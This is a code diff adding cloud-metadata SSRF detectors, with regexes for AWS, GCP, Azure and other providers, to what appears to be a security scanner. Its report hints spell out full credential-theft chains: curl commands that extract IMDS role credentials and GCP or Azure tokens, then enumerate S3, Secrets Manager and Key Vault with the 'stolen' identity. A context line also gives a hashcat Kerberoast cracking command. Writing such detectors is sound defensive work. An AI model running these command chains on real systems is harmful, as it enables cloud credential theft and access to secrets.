@@ -2202,6 +2202,44 @@ _TOMCAT_MANAGER_PATH = re.compile(
     r'(?:manager|host-manager)/(?:html|text|status)'
 )
 
+# iter-252: SSRF cloud metadata endpoint captured request/response.
+# Detects the SSRF ATTACK path (before creds are extracted). The
+# existing IMDS_BLOCK detector at line 5865 extracts already-captured
+# STS creds; this detector flags the earlier PATH signal so operator
+# knows to pivot to the STS-cred extraction.
+#
+# AWS Instance Metadata Service (IMDSv1 + IMDSv2)
+_SSRF_AWS_META = re.compile(
+    r'(?i)(?:https?://)?169\.254\.169\.254/(?:latest|1\.0|'
+    r'2007-\d{2}-\d{2}|2008-02-01|2009-04-04|2011-01-01)/'
+    r'(?:meta-data|user-data|dynamic|api)/'
+)
+_SSRF_AWS_META_KEY = re.compile(
+    r'(?i)\b(ami-id|instance-id|instance-type|instance-identity/'
+    r'document|iam/security-credentials|security-credentials/'
+    r'[\w\-]{2,80}|hostname|local-hostname|public-hostname|'
+    r'availability-zone|reservation-id)\b'
+)
+# GCP metadata service
+_SSRF_GCP_META = re.compile(
+    r'(?i)(?:https?://)?metadata\.google\.internal/computeMetadata/'
+    r'v\d+/|Metadata-Flavor\s*:\s*Google'
+)
+# Azure Instance Metadata Service
+_SSRF_AZURE_META = re.compile(
+    r'(?i)(?:https?://)?169\.254\.169\.254/metadata/'
+    r'(?:instance|identity)/?\?api-version='
+)
+# Oracle Cloud + Alibaba + DigitalOcean metadata endpoints
+_SSRF_OTHER_META = re.compile(
+    r'(?i)(?:'
+    r'169\.254\.169\.254/opc/v[12]/instance/|'  # Oracle
+    r'100\.100\.100\.200/latest/meta-data/|'  # Alibaba
+    r'169\.254\.169\.254/metadata/v1/|'  # DigitalOcean
+    r'metadata\.tencentyun\.com/latest/'  # Tencent
+    r')'
+)
+
 # iter-251: XXE (XML External Entity) captured payload detector.
 # Fires on captured XML injection attempts. Complements iter-239
 # (LFI response) - when XXE succeeds and reads /etc/passwd, both
@@ -3372,6 +3410,80 @@ def _multiline_passes(path, report, store):
                                      f"hashcat -m 13100 {_sam}.tgs "
                                      f"rockyou.txt -r rules/best64."
                                      f"rule"))
+
+    # iter-252: SSRF cloud metadata endpoint captured. Fires on any
+    # provider's metadata endpoint URL OR response-body identifier.
+    # AWS is broken out because IAM/STS extraction chains directly
+    # into the existing IMDS_BLOCK detector.
+    if not filters.is_doc_file(path):
+        _ssrf_aws = _SSRF_AWS_META.search(text[:32768])
+        _ssrf_aws_kv = _SSRF_AWS_META_KEY.search(text[:32768])
+        _ssrf_gcp = _SSRF_GCP_META.search(text[:32768])
+        _ssrf_az = _SSRF_AZURE_META.search(text[:32768])
+        _ssrf_other = _SSRF_OTHER_META.search(text[:32768])
+        # AWS: fire on either the endpoint URL OR the response body
+        # containing a metadata key (both are strong signals).
+        if _ssrf_aws or _ssrf_aws_kv:
+            _anchor_aws = _ssrf_aws or _ssrf_aws_kv
+            report.add("CRITICAL", "SECRET-SIDECHANNEL", path,
+                       _ln(_anchor_aws),
+                       "SSRF to AWS IMDS captured - IAM STS creds "
+                       "reachable",
+                       hint=("full chain (IMDSv1):  |  curl "
+                             "http://169.254.169.254/latest/meta-data/"
+                             "iam/security-credentials/  |  ROLE=$(curl "
+                             "-s .../security-credentials/); curl "
+                             "http://169.254.169.254/latest/meta-data/"
+                             "iam/security-credentials/$ROLE > creds."
+                             "json  |  IMDSv2 (token-first): TOKEN=$"
+                             "(curl -s -X PUT http://169.254.169.254/"
+                             "latest/api/token -H 'X-aws-ec2-metadata-"
+                             "token-ttl-seconds: 21600'); curl -H "
+                             "\"X-aws-ec2-metadata-token: $TOKEN\" "
+                             "http://.../security-credentials/$ROLE  "
+                             "|  post-cred: aws sts get-caller-identity"
+                             " --profile stolen; then enumerate S3 / "
+                             "SSM / Secrets Manager via aws cli with "
+                             "the stolen role"))
+        if _ssrf_gcp:
+            report.add("CRITICAL", "SECRET-SIDECHANNEL", path,
+                       _ln(_ssrf_gcp),
+                       "SSRF to GCP metadata captured - service-account "
+                       "token reachable",
+                       hint=("curl -H 'Metadata-Flavor: Google' "
+                             "http://metadata.google.internal/"
+                             "computeMetadata/v1/instance/"
+                             "service-accounts/default/token  |  "
+                             "returns short-lived OAuth token  |  "
+                             "next: gcloud auth activate-service-"
+                             "account --key-file=/dev/stdin <<< $TOKEN"
+                             "; then gcloud projects list, secrets "
+                             "list, storage buckets ls"))
+        if _ssrf_az:
+            report.add("CRITICAL", "SECRET-SIDECHANNEL", path,
+                       _ln(_ssrf_az),
+                       "SSRF to Azure IMDS captured - managed-identity "
+                       "token reachable",
+                       hint=("curl -H 'Metadata: true' "
+                             "'http://169.254.169.254/metadata/"
+                             "identity/oauth2/token?api-version="
+                             "2018-02-01&resource=https://management."
+                             "azure.com/'  |  returns access_token "
+                             "for the assigned managed identity  |  "
+                             "next: az login --identity; az account "
+                             "list; az keyvault secret list"))
+        if _ssrf_other:
+            _hits_provider = _ssrf_other.group(0)
+            _provider = "Oracle" if "opc/v" in _hits_provider else \
+                        ("Alibaba" if "100.100.100.200" in _hits_provider
+                         else ("DigitalOcean" if "metadata/v1"
+                               in _hits_provider else "Tencent"))
+            report.add("CRITICAL", "SECRET-SIDECHANNEL", path,
+                       _ln(_ssrf_other),
+                       f"SSRF to {_provider} cloud metadata captured",
+                       hint=("cloud-provider-specific token extraction "
+                             "path - check provider docs for the exact "
+                             "endpoint that returns credentials"))
 
     # iter-251: XXE captured payload. Fires on any of the three
     # signals independently - each is dispositive of an XXE attempt
